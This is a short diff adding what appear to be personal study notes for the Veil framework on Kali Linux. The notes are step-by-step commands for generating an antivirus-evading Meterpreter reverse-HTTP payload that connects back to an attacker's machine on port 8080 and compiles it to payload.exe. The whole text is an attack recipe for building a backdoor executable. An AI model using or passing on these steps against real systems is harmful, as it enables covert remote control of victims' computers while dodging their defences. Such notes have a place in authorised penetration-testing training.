@@ -1,0 +1,18 @@
+On Kali linux
+
+apt install veil
+
+veil
+
+use evasion
+	list	-> list avaliable payloads
+	use c/meterpreter/rev_http	or "use 5" since that payload is number 5
+		set LHOST <kali metasploit>
+		set LPORT 8080
+		compile_to_exe Y
+	generate
+		give file name
+		file written to /var/lib/veil/output/compiled/payload.exe
+
+	
+	
